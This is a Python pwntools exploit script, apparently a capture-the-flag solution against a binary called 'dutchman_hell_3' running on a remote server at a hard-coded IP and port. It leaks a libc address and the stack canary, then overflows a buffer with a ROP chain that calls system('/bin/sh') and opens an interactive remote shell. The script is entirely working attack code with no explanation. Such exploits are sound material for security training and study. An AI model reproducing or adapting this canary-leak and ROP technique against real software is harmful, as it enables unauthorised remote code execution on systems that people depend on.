from pwn import *
from time import sleep
import struct
import pwnlib.elf
import pwnlib.gdb


libc = ELF("./libc.so.6")
elf = ELF("./dutchman_hell_3")

pwnlib.context.context.clear(arch='amd64', os='linux')
pwnlib.context.context.terminal = ["tmux", "splitw", "-h"]
#p = process('./dutchman_hell_3')
p = remote("65.109.185.193", "5002")


def read_all_lines(i, decode = True):
	for _ in range(i):
	    line =	p.recvline()
	if decode:
		return line.decode('utf-8', errors='replace')
	return line

def convert_to_little(inp):
	return struct.pack('<Q', inp)		


# Read first lines
read_all_lines(2)

# Update Address
printf_address = read_all_lines(1)[25:]
printf_address = int(printf_address, 16)
libc.address += printf_address - libc.functions["printf"].address

# Read other lines
read_all_lines(6)

# Send 3 to enter in ME
p.sendline('3')
read_all_lines(1)

# Send payload to extract canary
canary_payload = "aaaaaaaaaaaaaaaaaaaMEDPT"
p.sendline(canary_payload)
canary = b"\x00" + read_all_lines(1, False)[14:14+7] 
print(f"canary is {canary}")

read_all_lines(6)

rop = ROP(libc)

binsh = next(libc.search(b"/bin/sh\x00"))
rop.call("system",[binsh])
payload = b'MEDPT 1aaaaaaaaaaaaaaaaa' + canary + b'\x11' * 8 + p64(rop.ret.address) + rop.chain()  

p.sendline('3')
read_all_lines(1)
p.sendline(payload)

p.interactive()
